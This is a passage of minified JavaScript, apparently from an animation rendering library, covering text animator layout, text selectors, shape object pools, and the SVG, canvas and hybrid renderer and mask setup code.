TextProperty(t,e){this._frameId=initialDefaultFrame,this.pv="",this.v="",this.kf=!1,this._isFirstFrame=!0,this._mdf=!1,this.data=e,this.elem=t,this.comp=this.elem.comp,this.keysIndex=0,this.canResize=!1,this.minimumFontSize=1,this.effectsSequence=[],this.currentData={ascent:0,boxWidth:this.defaultBoxWidth,f:"",fStyle:"",fWeight:"",fc:"",j:"",justifyOffset:"",l:[],lh:0,lineWidths:[],ls:"",of:"",s:"",sc:"",sw:0,t:0,tr:0,sz:0,ps:null,fillColorAnim:!1,strokeColorAnim:!1,strokeWidthAnim:!1,yOffset:0,finalSize:0,finalText:[],finalLineHeight:0,__complete:!1},this.copyData(this.currentData,this.data.d.k[0].s),this.searchProperty()||this.completeTextData(this.currentData)}TextAnimatorProperty.prototype.searchProperties=function(){var t,e,i=this._textData.a.length,r=PropertyFactory.getProp;for(t=0;t<i;t+=1)e=this._textData.a[t],this._animatorsData[t]=new TextAnimatorDataProperty(this._elem,e,this);this._textData.p&&"m"in this._textData.p?(this._pathData={f:r(this._elem,this._textData.p.f,0,0,this),l:r(this._elem,this._textData.p.l,0,0,this),r:this._textData.p.r,m:this._elem.maskManager.getMaskProperty(this._textData.p.m)},this._hasMaskedPath=!0):this._hasMaskedPath=!1,this._moreOptions.alignment=r(this._elem,this._textData.m.a,1,0,this)},TextAnimatorProperty.prototype.getMeasures=function(t,e){if(this.lettersChangedFlag=e,this._mdf||this._isFirstFrame||e||this._hasMaskedPath&&this._pathData.m._mdf){this._isFirstFrame=!1;var i,r,n,s,o,a,l,h,c,u,d,p,m,f,g,y,v,_,b,w=this._moreOptions.alignment.v,E=this._animatorsData,S=this._textData,A=this.mHelper,C=this._renderType,T=this.renderedLetters.length,$=(this.data,t.l);if(this._hasMaskedPath){if(b=this._pathData.m,!this._pathData.n||this._pathData._mdf){var I,P=b.v;for(this._pathData.r&&(P=P.reverse()),o={tLength:0,segments:[]},s=P._length-1,y=0,n=0;n<s;n+=1)I=bez.buildBezierData(P.v[n],P.v[n+1],[P.o[n][0]-P.v[n][0],P.o[n][1]-P.v[n][1]],[P.i[n+1][0]-P.v[n+1][0],P.i[n+1][1]-P.v[n+1][1]]),o.tLength+=I.segmentLength,o.segments.push(I),y+=I.segmentLength;n=s,b.v.c&&(I=bez.buildBezierData(P.v[n],P.v[0],[P.o[n][0]-P.v[n][0],P.o[n][1]-P.v[n][1]],[P.i[0][0]-P.v[0][0],P.i[0][1]-P.v[0][1]]),o.tLength+=I.segmentLength,o.segments.push(I),y+=I.segmentLength),this._pathData.pi=o}if(o=this._pathData.pi,a=this._pathData.f.v,d=0,u=1,h=0,c=!0,f=o.segments,a<0&&b.v.c)for(o.tLength<Math.abs(a)&&(a=-Math.abs(a)%o.tLength),u=(m=f[d=f.length-1].points).length-1;a<0;)a+=m[u].partialLength,(u-=1)<0&&(u=(m=f[d-=1].points).length-1);p=(m=f[d].points)[u-1],g=(l=m[u]).partialLength}s=$.length,i=0,r=0;var x,k,O,M,D=1.2*t.finalSize*.714,R=!0;O=E.length;var L,N,F,V,q,B,U,W,H,G,z,j,Y,X=-1,Q=a,K=d,Z=u,J=-1,tt="",et=this.defaultPropsArray;if(2===t.j||1===t.j){var it=0,rt=0,nt=2===t.j?-.5:-1,st=0,ot=!0;for(n=0;n<s;n+=1)if($[n].n){for(it&&(it+=rt);st<n;)$[st].animatorJustifyOffset=it,st+=1;it=0,ot=!0}else{for(k=0;k<O;k+=1)(x=E[k].a).t.propType&&(ot&&2===t.j&&(rt+=x.t.v*nt),(L=E[k].s.getMult($[n].anIndexes[k],S.a[k].s.totalChars)).length?it+=x.t.v*L[0]*nt:it+=x.t.v*L*nt);ot=!1}for(it&&(it+=rt);st<n;)$[st].animatorJustifyOffset=it,st+=1}for(n=0;n<s;n+=1){if(A.reset(),q=1,$[n].n)i=0,r+=t.yOffset,r+=R?1:0,a=Q,R=!1,this._hasMaskedPath&&(u=Z,p=(m=f[d=K].points)[u-1],g=(l=m[u]).partialLength,h=0),Y=G=j=tt="",et=this.defaultPropsArray;else{if(this._hasMaskedPath){if(J!==$[n].line){switch(t.j){case 1:a+=y-t.lineWidths[$[n].line];break;case 2:a+=(y-t.lineWidths[$[n].line])/2}J=$[n].line}X!==$[n].ind&&($[X]&&(a+=$[X].extra),a+=$[n].an/2,X=$[n].ind),a+=w[0]*$[n].an/200;var at=0;for(k=0;k<O;k+=1)(x=E[k].a).p.propType&&((L=E[k].s.getMult($[n].anIndexes[k],S.a[k].s.totalChars)).length?at+=x.p.v[0]*L[0]:at+=x.p.v[0]*L),x.a.propType&&((L=E[k].s.getMult($[n].anIndexes[k],S.a[k].s.totalChars)).length?at+=x.a.v[0]*L[0]:at+=x.a.v[0]*L);for(c=!0;c;)h+g>=a+at||!m?(v=(a+at-h)/l.partialLength,F=p.point[0]+(l.point[0]-p.point[0])*v,V=p.point[1]+(l.point[1]-p.point[1])*v,A.translate(-w[0]*$[n].an/200,-w[1]*D/100),c=!1):m&&(h+=l.partialLength,(u+=1)>=m.length&&(u=0,f[d+=1]?m=f[d].points:b.v.c?(u=0,m=f[d=0].points):(h-=l.partialLength,m=null)),m&&(p=l,g=(l=m[u]).partialLength));N=$[n].an/2-$[n].add,A.translate(-N,0,0)}else N=$[n].an/2-$[n].add,A.translate(-N,0,0),A.translate(-w[0]*$[n].an/200,-w[1]*D/100,0);for($[n].l,k=0;k<O;k+=1)(x=E[k].a).t.propType&&(L=E[k].s.getMult($[n].anIndexes[k],S.a[k].s.totalChars),(0!==i||0!==t.j)&&(this._hasMaskedPath?L.length?a+=x.t.v*L[0]:a+=x.t.v*L:L.length?i+=x.t.v*L[0]:i+=x.t.v*L));for($[n].l,t.strokeWidthAnim&&(U=t.sw||0),t.strokeColorAnim&&(B=t.sc?[t.sc[0],t.sc[1],t.sc[2]]:[0,0,0]),t.fillColorAnim&&t.fc&&(W=[t.fc[0],t.fc[1],t.fc[2]]),k=0;k<O;k+=1)(x=E[k].a).a.propType&&((L=E[k].s.getMult($[n].anIndexes[k],S.a[k].s.totalChars)).length?A.translate(-x.a.v[0]*L[0],-x.a.v[1]*L[1],x.a.v[2]*L[2]):A.translate(-x.a.v[0]*L,-x.a.v[1]*L,x.a.v[2]*L));for(k=0;k<O;k+=1)(x=E[k].a).s.propType&&((L=E[k].s.getMult($[n].anIndexes[k],S.a[k].s.totalChars)).length?A.scale(1+(x.s.v[0]-1)*L[0],1+(x.s.v[1]-1)*L[1],1):A.scale(1+(x.s.v[0]-1)*L,1+(x.s.v[1]-1)*L,1));for(k=0;k<O;k+=1){if(x=E[k].a,L=E[k].s.getMult($[n].anIndexes[k],S.a[k].s.totalChars),x.sk.propType&&(L.length?A.skewFromAxis(-x.sk.v*L[0],x.sa.v*L[1]):A.skewFromAxis(-x.sk.v*L,x.sa.v*L)),x.r.propType&&(L.length?A.rotateZ(-x.r.v*L[2]):A.rotateZ(-x.r.v*L)),x.ry.propType&&(L.length?A.rotateY(x.ry.v*L[1]):A.rotateY(x.ry.v*L)),x.rx.propType&&(L.length?A.rotateX(x.rx.v*L[0]):A.rotateX(x.rx.v*L)),x.o.propType&&(L.length?q+=(x.o.v*L[0]-q)*L[0]:q+=(x.o.v*L-q)*L),t.strokeWidthAnim&&x.sw.propType&&(L.length?U+=x.sw.v*L[0]:U+=x.sw.v*L),t.strokeColorAnim&&x.sc.propType)for(H=0;H<3;H+=1)L.length?B[H]=B[H]+(x.sc.v[H]-B[H])*L[0]:B[H]=B[H]+(x.sc.v[H]-B[H])*L;if(t.fillColorAnim&&t.fc){if(x.fc.propType)for(H=0;H<3;H+=1)L.length?W[H]=W[H]+(x.fc.v[H]-W[H])*L[0]:W[H]=W[H]+(x.fc.v[H]-W[H])*L;x.fh.propType&&(W=L.length?addHueToRGB(W,x.fh.v*L[0]):addHueToRGB(W,x.fh.v*L)),x.fs.propType&&(W=L.length?addSaturationToRGB(W,x.fs.v*L[0]):addSaturationToRGB(W,x.fs.v*L)),x.fb.propType&&(W=L.length?addBrightnessToRGB(W,x.fb.v*L[0]):addBrightnessToRGB(W,x.fb.v*L))}}for(k=0;k<O;k+=1)(x=E[k].a).p.propType&&(L=E[k].s.getMult($[n].anIndexes[k],S.a[k].s.totalChars),this._hasMaskedPath?L.length?A.translate(0,x.p.v[1]*L[0],-x.p.v[2]*L[1]):A.translate(0,x.p.v[1]*L,-x.p.v[2]*L):L.length?A.translate(x.p.v[0]*L[0],x.p.v[1]*L[1],-x.p.v[2]*L[2]):A.translate(x.p.v[0]*L,x.p.v[1]*L,-x.p.v[2]*L));if(t.strokeWidthAnim&&(G=U<0?0:U),t.strokeColorAnim&&(z="rgb("+Math.round(255*B[0])+","+Math.round(255*B[1])+","+Math.round(255*B[2])+")"),t.fillColorAnim&&t.fc&&(j="rgb("+Math.round(255*W[0])+","+Math.round(255*W[1])+","+Math.round(255*W[2])+")"),this._hasMaskedPath){if(A.translate(0,-t.ls),A.translate(0,w[1]*D/100+r,0),S.p.p){_=(l.point[1]-p.point[1])/(l.point[0]-p.point[0]);var lt=180*Math.atan(_)/Math.PI;l.point[0]<p.point[0]&&(lt+=180),A.rotate(-lt*Math.PI/180)}A.translate(F,V,0),a-=w[0]*$[n].an/200,$[n+1]&&X!==$[n+1].ind&&(a+=$[n].an/2,a+=t.tr/1e3*t.finalSize)}else{switch(A.translate(i,r,0),t.ps&&A.translate(t.ps[0],t.ps[1]+t.ascent,0),t.j){case 1:A.translate($[n].animatorJustifyOffset+t.justifyOffset+(t.boxWidth-t.lineWidths[$[n].line]),0,0);break;case 2:A.translate($[n].animatorJustifyOffset+t.justifyOffset+(t.boxWidth-t.lineWidths[$[n].line])/2,0,0)}A.translate(0,-t.ls),A.translate(N,0,0),A.translate(w[0]*$[n].an/200,w[1]*D/100,0),i+=$[n].l+t.tr/1e3*t.finalSize}"html"===C?tt=A.toCSS():"svg"===C?tt=A.to2dCSS():et=[A.props[0],A.props[1],A.props[2],A.props[3],A.props[4],A.props[5],A.props[6],A.props[7],A.props[8],A.props[9],A.props[10],A.props[11],A.props[12],A.props[13],A.props[14],A.props[15]],Y=q}T<=n?(M=new LetterProps(Y,G,z,j,tt,et),this.renderedLetters.push(M),T+=1,this.lettersChangedFlag=!0):(M=this.renderedLetters[n],this.lettersChangedFlag=M.update(Y,G,z,j,tt,et)||this.lettersChangedFlag)}}},TextAnimatorProperty.prototype.getValue=function(){this._elem.globalData.frameId!==this._frameId&&(this._frameId=this._elem.globalData.frameId,this.iterateDynamicProperties())},TextAnimatorProperty.prototype.mHelper=new Matrix,TextAnimatorProperty.prototype.defaultPropsArray=[],extendPrototype([DynamicPropertyContainer],TextAnimatorProperty),LetterProps.prototype.update=function(t,e,i,r,n,s){this._mdf.o=!1,this._mdf.sw=!1,this._mdf.sc=!1,this._mdf.fc=!1,this._mdf.m=!1,this._mdf.p=!1;var o=!1;return this.o!==t&&(this.o=t,this._mdf.o=!0,o=!0),this.sw!==e&&(this.sw=e,this._mdf.sw=!0,o=!0),this.sc!==i&&(this.sc=i,this._mdf.sc=!0,o=!0),this.fc!==r&&(this.fc=r,this._mdf.fc=!0,o=!0),this.m!==n&&(this.m=n,this._mdf.m=!0,o=!0),s.length&&(this.p[0]!==s[0]||this.p[1]!==s[1]||this.p[4]!==s[4]||this.p[5]!==s[5]||this.p[12]!==s[12]||this.p[13]!==s[13])&&(this.p=s,this._mdf.p=!0,o=!0),o},TextProperty.prototype.defaultBoxWidth=[0,0],TextProperty.prototype.copyData=function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i]);return t},TextProperty.prototype.setCurrentData=function(t){t.__complete||this.completeTextData(t),this.currentData=t,this.currentData.boxWidth=this.currentData.boxWidth||this.defaultBoxWidth,this._mdf=!0},TextProperty.prototype.searchProperty=function(){return this.searchKeyframes()},TextProperty.prototype.searchKeyframes=function(){return this.kf=this.data.d.k.length>1,this.kf&&this.addEffect(this.getKeyframeValue.bind(this)),this.kf},TextProperty.prototype.addEffect=function(t){this.effectsSequence.push(t),this.elem.addDynamicProperty(this)},TextProperty.prototype.getValue=function(t){if(this.elem.globalData.frameId!==this.frameId&&this.effectsSequence.length||t){this.currentData.t=this.data.d.k[this.keysIndex].s.t;var e=this.currentData,i=this.keysIndex;if(this.lock)return void this.setCurrentData(this.currentData);this.lock=!0,this._mdf=!1;var r,n=this.effectsSequence.length,s=t||this.data.d.k[this.keysIndex].s;for(r=0;r<n;r+=1)s=i!==this.keysIndex?this.effectsSequence[r](s,s.t):this.effectsSequence[r](this.currentData,s.t);e!==s&&this.setCurrentData(s),this.pv=this.v=this.currentData,this.lock=!1,this.frameId=this.elem.globalData.frameId}},TextProperty.prototype.getKeyframeValue=function(){for(var t=this.data.d.k,e=this.elem.comp.renderedFrame,i=0,r=t.length;i<=r-1&&(t[i].s,!(i===r-1||t[i+1].t>e));)i+=1;return this.keysIndex!==i&&(this.keysIndex=i),this.data.d.k[this.keysIndex].s},TextProperty.prototype.buildFinalText=function(t){for(var e,i=FontManager.getCombinedCharacterCodes(),r=[],n=0,s=t.length;n<s;)e=t.charCodeAt(n),-1!==i.indexOf(e)?r[r.length-1]+=t.charAt(n):e>=55296&&e<=56319&&(e=t.charCodeAt(n+1))>=56320&&e<=57343?(r.push(t.substr(n,2)),++n):r.push(t.charAt(n)),n+=1;return r},TextProperty.prototype.completeTextData=function(t){t.__complete=!0;var e,i,r,n,s,o,a,l,h=this.elem.globalData.fontManager,c=this.data,u=[],d=0,p=c.m.g,m=0,f=0,g=0,y=[],v=0,_=0,b=h.getFontByName(t.f),w=0,E=b.fStyle?b.fStyle.split(" "):[],S="normal",A="normal";for(i=E.length,e=0;e<i;e+=1)switch(l=E[e].toLowerCase(),l){case"italic":A="italic";break;case"bold":S="700";break;case"black":S="900";break;case"medium":S="500";break;case"regular":case"normal":S="400";break;case"light":case"thin":S="200"}t.fWeight=b.fWeight||S,t.fStyle=A,t.finalSize=t.s,t.finalText=this.buildFinalText(t.t),i=t.finalText.length,t.finalLineHeight=t.lh;var C,T=t.tr/1e3*t.finalSize;if(t.sz)for(var $,I,P=!0,x=t.sz[0],k=t.sz[1];P;){$=0,v=0,i=(I=this.buildFinalText(t.t)).length,T=t.tr/1e3*t.finalSize;var O=-1;for(e=0;e<i;e+=1)C=I[e].charCodeAt(0),r=!1," "===I[e]?O=e:(13===C||3===C)&&(v=0,r=!0,$+=t.finalLineHeight||1.2*t.finalSize),h.chars?(a=h.getCharData(I[e],b.fStyle,b.fFamily),w=r?0:a.w*t.finalSize/100):w=h.measureText(I[e],t.f,t.finalSize),v+w>x&&" "!==I[e]?(-1===O?i+=1:e=O,$+=t.finalLineHeight||1.2*t.finalSize,I.splice(e,O===e?1:0,"\r"),O=-1,v=0):(v+=w,v+=T);$+=b.ascent*t.finalSize/100,this.canResize&&t.finalSize>this.minimumFontSize&&k<$?(t.finalSize-=1,t.finalLineHeight=t.finalSize*t.lh/t.s):(t.finalText=I,i=t.finalText.length,P=!1)}v=-T,w=0;var M,D=0;for(e=0;e<i;e+=1)if(r=!1,13===(C=(M=t.finalText[e]).charCodeAt(0))||3===C?(D=0,y.push(v),_=v>_?v:_,v=-2*T,n="",r=!0,g+=1):n=M,h.chars?(a=h.getCharData(M,b.fStyle,h.getFontByName(t.f).fFamily),w=r?0:a.w*t.finalSize/100):w=h.measureText(n,t.f,t.finalSize)," "===M?D+=w+T:(v+=w+T+D,D=0),u.push({l:w,an:w,add:m,n:r,anIndexes:[],val:n,line:g,animatorJustifyOffset:0}),2==p){if(m+=w,""===n||" "===n||e===i-1){for((""===n||" "===n)&&(m-=w);f<=e;)u[f].an=m,u[f].ind=d,u[f].extra=w,f+=1;d+=1,m=0}}else if(3==p){if(m+=w,""===n||e===i-1){for(""===n&&(m-=w);f<=e;)u[f].an=m,u[f].ind=d,u[f].extra=w,f+=1;m=0,d+=1}}else u[d].ind=d,u[d].extra=0,d+=1;if(t.l=u,_=v>_?v:_,y.push(v),t.sz)t.boxWidth=t.sz[0],t.justifyOffset=0;else switch(t.boxWidth=_,t.j){case 1:t.justifyOffset=-t.boxWidth;break;case 2:t.justifyOffset=-t.boxWidth/2;break;default:t.justifyOffset=0}t.lineWidths=y;var R,L,N=c.a;o=N.length;var F,V,q=[];for(s=0;s<o;s+=1){for((R=N[s]).a.sc&&(t.strokeColorAnim=!0),R.a.sw&&(t.strokeWidthAnim=!0),(R.a.fc||R.a.fh||R.a.fs||R.a.fb)&&(t.fillColorAnim=!0),V=0,F=R.s.b,e=0;e<i;e+=1)(L=u[e]).anIndexes[s]=V,(1==F&&""!==L.val||2==F&&""!==L.val&&" "!==L.val||3==F&&(L.n||" "==L.val||e==i-1)||4==F&&(L.n||e==i-1))&&(1===R.s.rn&&q.push(V),V+=1);c.a[s].s.totalChars=V;var B,U=-1;if(1===R.s.rn)for(e=0;e<i;e+=1)U!=(L=u[e]).anIndexes[s]&&(U=L.anIndexes[s],B=q.splice(Math.floor(Math.random()*q.length),1)[0]),L.anIndexes[s]=B}t.yOffset=t.finalLineHeight||1.2*t.finalSize,t.ls=t.ls||0,t.ascent=b.ascent*t.finalSize/100},TextProperty.prototype.updateDocumentData=function(t,e){e=void 0===e?this.keysIndex:e;var i=this.copyData({},this.data.d.k[e].s);i=this.copyData(i,t),this.data.d.k[e].s=i,this.recalculate(e),this.elem.addDynamicProperty(this)},TextProperty.prototype.recalculate=function(t){var e=this.data.d.k[t].s;e.__complete=!1,this.keysIndex=0,this._isFirstFrame=!0,this.getValue(e)},TextProperty.prototype.canResizeFont=function(t){this.canResize=t,this.recalculate(this.keysIndex),this.elem.addDynamicProperty(this)},TextProperty.prototype.setMinimumFontSize=function(t){this.minimumFontSize=Math.floor(t)||1,this.recalculate(this.keysIndex),this.elem.addDynamicProperty(this)};var TextSelectorProp=function(){var t=Math.max,e=Math.min,i=Math.floor;function r(t,e){this._currentTextLength=-1,this.k=!1,this.data=e,this.elem=t,this.comp=t.comp,this.finalS=0,this.finalE=0,this.initDynamicPropertyContainer(t),this.s=PropertyFactory.getProp(t,e.s||{k:0},0,0,this),this.e="e"in e?PropertyFactory.getProp(t,e.e,0,0,this):{v:100},this.o=PropertyFactory.getProp(t,e.o||{k:0},0,0,this),this.xe=PropertyFactory.getProp(t,e.xe||{k:0},0,0,this),this.ne=PropertyFactory.getProp(t,e.ne||{k:0},0,0,this),this.a=PropertyFactory.getProp(t,e.a,0,.01,this),this.dynamicProperties.length||this.getValue()}return r.prototype={getMult:function(r){this._currentTextLength!==this.elem.textProperty.currentData.l.length&&this.getValue();var n=0,s=0,o=1,a=1;this.ne.v>0?n=this.ne.v/100:s=-this.ne.v/100,this.xe.v>0?o=1-this.xe.v/100:a=1+this.xe.v/100;var l=BezierFactory.getBezierEasing(n,s,o,a).get,h=0,c=this.finalS,u=this.finalE,d=this.data.sh;if(2===d)h=l(h=u===c?r>=u?1:0:t(0,e(.5/(u-c)+(r-c)/(u-c),1)));else if(3===d)h=l(h=u===c?r>=u?0:1:1-t(0,e(.5/(u-c)+(r-c)/(u-c),1)));else if(4===d)u===c?h=0:(h=t(0,e(.5/(u-c)+(r-c)/(u-c),1)))<.5?h*=2:h=1-2*(h-.5),h=l(h);else if(5===d){if(u===c)h=0;else{var p=u-c,m=-p/2+(r=e(t(0,r+.5-c),u-c)),f=p/2;h=Math.sqrt(1-m*m/(f*f))}h=l(h)}else 6===d?(u===c?h=0:(r=e(t(0,r+.5-c),u-c),h=(1+Math.cos(Math.PI+2*Math.PI*r/(u-c)))/2),h=l(h)):(r>=i(c)&&(h=t(0,e(r-c<0?e(u,1)-(c-r):u-r,1))),h=l(h));return h*this.a.v},getValue:function(t){this.iterateDynamicProperties(),this._mdf=t||this._mdf,this._currentTextLength=this.elem.textProperty.currentData.l.length||0,t&&2===this.data.r&&(this.e.v=this._currentTextLength);var e=2===this.data.r?1:100/this.data.totalChars,i=this.o.v/e,r=this.s.v/e+i,n=this.e.v/e+i;if(r>n){var s=r;r=n,n=s}this.finalS=r,this.finalE=n}},extendPrototype([DynamicPropertyContainer],r),{getTextSelectorProp:function(t,e,i){return new r(t,e,i)}}}(),pool_factory=function(t,e,i,r){var n=0,s=t,o=createSizedArray(s);function a(){return n?o[n-=1]:e()}return{newElement:a,release:function(t){n===s&&(o=pooling.double(o),s*=2),i&&i(t),o[n]=t,n+=1}}},pooling={double:function(t){return t.concat(createSizedArray(t.length))}},point_pool=pool_factory(8,(function(){return createTypedArray("float32",2)})),shape_pool=(i=pool_factory(4,(function(){return new ShapePath}),(function(t){var e,i=t._length;for(e=0;e<i;e+=1)point_pool.release(t.v[e]),point_pool.release(t.i[e]),point_pool.release(t.o[e]),t.v[e]=null,t.i[e]=null,t.o[e]=null;t._length=0,t.c=!1})),i.clone=function(t){var e,r=i.newElement(),n=void 0===t._length?t.v.length:t._length;for(r.setLength(n),r.c=t.c,e=0;e<n;e+=1)r.setTripleAt(t.v[e][0],t.v[e][1],t.o[e][0],t.o[e][1],t.i[e][0],t.i[e][1],e);return r},i),shapeCollection_pool=function(){var t={newShapeCollection:function(){return e?r[e-=1]:new ShapeCollection},release:function(t){var n,s=t._length;for(n=0;n<s;n+=1)shape_pool.release(t.shapes[n]);t._length=0,e===i&&(r=pooling.double(r),i*=2),r[e]=t,e+=1}},e=0,i=4,r=createSizedArray(i);return t}(),segments_length_pool=pool_factory(8,(function(){return{lengths:[],totalLength:0}}),(function(t){var e,i=t.lengths.length;for(e=0;e<i;e+=1)bezier_length_pool.release(t.lengths[e]);t.lengths.length=0})),bezier_length_pool=pool_factory(8,(function(){return{addedLength:0,percents:createTypedArray("float32",defaultCurveSegments),lengths:createTypedArray("float32",defaultCurveSegments)}})),i;function BaseRenderer(){}function SVGRenderer(t,e){this.animationItem=t,this.layers=null,this.renderedFrame=-1,this.svgElement=createNS("svg");var i="";if(e&&e.title){var r=createNS("title"),n=createElementID();r.setAttribute("id",n),r.textContent=e.title,this.svgElement.appendChild(r),i+=n}if(e&&e.description){var s=createNS("desc"),o=createElementID();s.setAttribute("id",o),s.textContent=e.description,this.svgElement.appendChild(s),i+=" "+o}i&&this.svgElement.setAttribute("aria-labelledby",i);var a=createNS("defs");this.svgElement.appendChild(a);var l=createNS("g");this.svgElement.appendChild(l),this.layerElement=l,this.renderConfig={preserveAspectRatio:e&&e.preserveAspectRatio||"xMidYMid meet",imagePreserveAspectRatio:e&&e.imagePreserveAspectRatio||"xMidYMid slice",progressiveLoad:e&&e.progressiveLoad||!1,hideOnTransparent:!(e&&!1===e.hideOnTransparent),viewBoxOnly:e&&e.viewBoxOnly||!1,viewBoxSize:e&&e.viewBoxSize||!1,className:e&&e.className||"",id:e&&e.id||"",focusable:e&&e.focusable,filterSize:{width:e&&e.filterSize&&e.filterSize.width||"100%",height:e&&e.filterSize&&e.filterSize.height||"100%",x:e&&e.filterSize&&e.filterSize.x||"0%",y:e&&e.filterSize&&e.filterSize.y||"0%"}},this.globalData={_mdf:!1,frameNum:-1,defs:a,renderConfig:this.renderConfig},this.elements=[],this.pendingElements=[],this.destroyed=!1,this.rendererType="svg"}function CanvasRenderer(t,e){this.animationItem=t,this.renderConfig={clearCanvas:!e||void 0===e.clearCanvas||e.clearCanvas,context:e&&e.context||null,progressiveLoad:e&&e.progressiveLoad||!1,preserveAspectRatio:e&&e.preserveAspectRatio||"xMidYMid meet",imagePreserveAspectRatio:e&&e.imagePreserveAspectRatio||"xMidYMid slice",className:e&&e.className||"",id:e&&e.id||""},this.renderConfig.dpr=e&&e.dpr||1,this.animationItem.wrapper&&(this.renderConfig.dpr=e&&e.dpr||window.devicePixelRatio||1),this.renderedFrame=-1,this.globalData={frameNum:-1,_mdf:!1,renderConfig:this.renderConfig,currentGlobalAlpha:-1},this.contextData=new CVContextData,this.elements=[],this.pendingElements=[],this.transformMat=new Matrix,this.completeLayers=!1,this.rendererType="canvas"}function HybridRenderer(t,e){this.animationItem=t,this.layers=null,this.renderedFrame=-1,this.renderConfig={className:e&&e.className||"",imagePreserveAspectRatio:e&&e.imagePreserveAspectRatio||"xMidYMid slice",hideOnTransparent:!(e&&!1===e.hideOnTransparent),filterSize:{width:e&&e.filterSize&&e.filterSize.width||"400%",height:e&&e.filterSize&&e.filterSize.height||"400%",x:e&&e.filterSize&&e.filterSize.x||"-100%",y:e&&e.filterSize&&e.filterSize.y||"-100%"}},this.globalData={_mdf:!1,frameNum:-1,renderConfig:this.renderConfig},this.pendingElements=[],this.elements=[],this.threeDElements=[],this.destroyed=!1,this.camera=null,this.supports3d=!0,this.rendererType="html"}function MaskElement(t,e,i){this.data=t,this.element=e,this.globalData=i,this.storedData=[],this.masksProperties=this.data.masksProperties||[],this.maskElement=null;var r,n=this.globalData.defs,s=this.masksProperties?this.masksProperties.length:0;this.viewData=createSizedArray(s),this.solidPath="";var o,a,l,h,c,u,d,p=this.masksProperties,m=0,f=[],g=createElementID(),y="clipPath",v="clip-path";for(r=0;r<s;r++)if(("a"!==p[r].mode&&"n"!==p[r].mode||p[r].inv||100!==p[r].o.k||p[r].o.x)&&(y="mask",v="mask"),"s"!=p[r].mode&&"i"!=p[r].mode||0!==m?h=null:((h=createNS("rect")).setAttribute("fill","#ffffff"),h.setAttribute("width",this.element.comp.data.w||0),h.setAttribute("height",this.element.comp.data.h||0),f.push(h)),o=createNS("path"),"n"!=p[r].mode){var _;if(m+=1,o.setAttribute("fill","s"===p[r].mode?"#000000":"#ffffff"),o.setAttribute("clip-rule","nonzero"),0!==p[r].x.k?(y="mask",v="mask",d=PropertyFactory.getProp(this.element,p[r].x,0,null,this.element),_=createElementID(),(c=createNS("filter")).setAttribute("id",_),(u=createNS("feMorphology")).setAttribute("operator","erode"),u.setAttribute("in","SourceGraphic"),u.setAttribute("radius","0"),c.appendChild(u),n.appendChild(c),o.setAttribute("stroke","s"===p[r].mode?"#000000":"#ffffff")):(u=null,d=null),this.storedData[r]={elem:o,x:d,expan:u,lastPath:"",lastOperator:"",filterId:_,lastRadius:0},"i"==p[r].mode){l=f.length;var b=createNS("g");for(a=0;a<l;a+=1)b.appendChild(f[a]);var w=createNS("mask");w.setAttribute("mask-type","alpha"),w.setAttribute("id",g+"_"+m),w.appendChild(o),n.appendChild(w),b.setAttribute("mask","url("+locationHref+"#"+g+"_"+m+")"),f.length=0,f.push(b)}else f.push(o);p[r].inv&&!this.solidPath&&(this.solidPath=this.createLayerSolidPath()),this.viewData[r]={elem:o,lastPath:"",op:PropertyFactory.getProp(this.element,p[r].o,0,.01,this.element),prop:ShapePropertyFactory.getShapeProp(this.element,p[r],3),invRect:h},this.viewData[r].prop.k||this.drawPath(p[r],this.viewData[r].prop.v,this.viewData[r])}else this.viewData[r]={op:PropertyFactory.getProp(this.element,p[r].o,0,.01,this.element),prop:ShapePropertyFactory.getShapeProp(this.element,p[r],3),elem:o,lastPath:""},n.appendChild(o);for(this.maskElement=createNS(y),s=f.length,r=0;r<s;r+=1)this.maskElement.appendChild(f[r]);m>0&&(this.maskElement.setAttribute("id",g),this.element.maskedElement.setAttribute(v,"url("+locationHref+"#"+g+")"),n.appendChild(this.maskElement)),this.viewData.length&&this.element.addRenderableComponent(this)}function HierarchyElement(){}function FrameElement(){}function TransformElement(){}function RenderableElement(){}function RenderableDOMElement(){}function ProcessedElement(t,e){this.elem=t,this.pos=e}function SVGStyleData(t,e){this.data=t,this.type=t.ty,this.d="",this.lvl=e,this._mdf=!1,this.closed=!0===t.hd,this.pElem=createNS("path"),this.msElem=null}function SVGShapeData(t,e,i){this.caches=[],this.styles=[],this.transformers=t,this.lStr="",this.sh=i,this.lvl=e,this._isAnimated=!!i.k;for(var r=0,n=t.length;r<n;){if(t[r].mProps.dynamicProperties.length){this._isAnimated=!0;break}r+=1}}function SVGTransformData(t,e,i){this.transform={mProps:t,op:e,container:i},this.elements=[],this._isAnimated=this.transform.mProps.dynamicProperties.length||this.transform.op.effectsSequence.length}function SVGStrokeStyleData(t,e,i){this.initDynamicPropertyContainer(t),this.getValue=this.iterateDynamicProperties,this.o=PropertyFactory.getProp(t,e.o,0,.01,this),this.w=PropertyFactory.getProp(t,e.w,0,null,this),this.d=new DashProperty(t,e.d||{},"svg",this),this.c=PropertyFactory.getProp(t,e.c,1,255,this),this.style=i,this._isAnimated=!!this._isAnimated}function SVGFillStyleData(t,e,i){this.initDynamicPropertyContainer(t),this.getValue=this.iterateDynamicProperties,this.o=PropertyFactory.getProp(t,e.o,0,.01,this),this.c=PropertyFactory.getProp(t,e.c,1,255,this),this.style=i}function SVGGradientFillStyleData(t,e,i){this.initDynamicPropertyContainer(t),this.getValue=this.iterateDynamicProperties,this.initGradientData(t,e,i)}function SVGGradientStrokeStyleData(t,e,i){this.initDynamicPropertyContainer(t),this.getValue=this.iterateDynamicProperties,this.w=PropertyFactory.getProp(t,e.w,0,null,this),this.d=new DashProperty(t,e.d||{},"svg",this),this.initGradientData(t,e,i),this._isAnimated=!!this._isAnimated}function ShapeGroupData(){this.it=[],this.prevViewData=[],this.gr=createNS("g")}BaseRenderer.prototype.checkLayers=function(t){var e,i,r=this.layers.length;for(this.completeLayers=!0,e=r-1;e>=0;e--)this.elements[e]||(i=this.layers[e]).ip-i.st<=t-this.layers[e].st&&i.op-i.st>t-this.layers[e].st&&this.buildItem(e),this.completeLayers=!!this.elements[e]&&this.completeLayers;this.checkPendingElements()},BaseRenderer.prototype.createItem=function(t){switch(t.ty){case 2:return this.createImage(t);case 0:return this.createComp(t);case 1:return this.createSolid(t);case 3:return this.createNull(t);case 4:return this.createShape(t);case 5:return this.createText(t);case 13:return this.createCamera(t)}return this.createNull(t)},BaseRenderer.prototype.createCamera=function(){throw new Error("You're using a 3d camera. Try the html 